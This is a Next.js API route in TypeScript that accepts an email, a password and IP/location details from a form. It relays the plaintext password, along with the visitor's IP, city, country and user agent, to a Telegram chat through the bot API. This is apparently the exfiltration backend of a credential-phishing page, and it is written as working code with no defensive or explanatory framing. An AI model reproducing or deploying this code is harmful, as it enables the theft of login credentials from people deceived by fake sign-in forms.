import { NextResponse } from "next/server";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export async function POST(request: Request) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return NextResponse.json(
      { error: "Telegram configuration is missing on the server." },
      { status: 500 }
    );
  }

  try {
    const body = await request.json();
    const { email, password, ip } = body ?? {};

    if (!email || !password) {
      return NextResponse.json(
        { error: "Email and password are required." },
        { status: 400 }
      );
    }

    const userAgent = request.headers.get("user-agent") || "(Unknown)";
    const ipAddress = request.headers.get("x-forwarded-for") || "(Unknown)";

    const text = `New form submission from ${
      ip?.ip || ipAddress
    } (${ip?.city || "Unknown"}, ${ip?.country || "Unknown"}) (${userAgent}):\nEmail: ${email}\nPassword: ${password}`;

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text,
        }),
      }
    );

    if (!telegramResponse.ok) {
      const errorText = await telegramResponse.text();

      return NextResponse.json(
        { error: "Failed to send message to Telegram.", details: errorText },
        { status: 502 }
      );
    }

    return NextResponse.json({ success: true });
  } catch {
    return NextResponse.json(
      { error: "Unexpected server error." },
      { status: 500 }
    );
  }
}
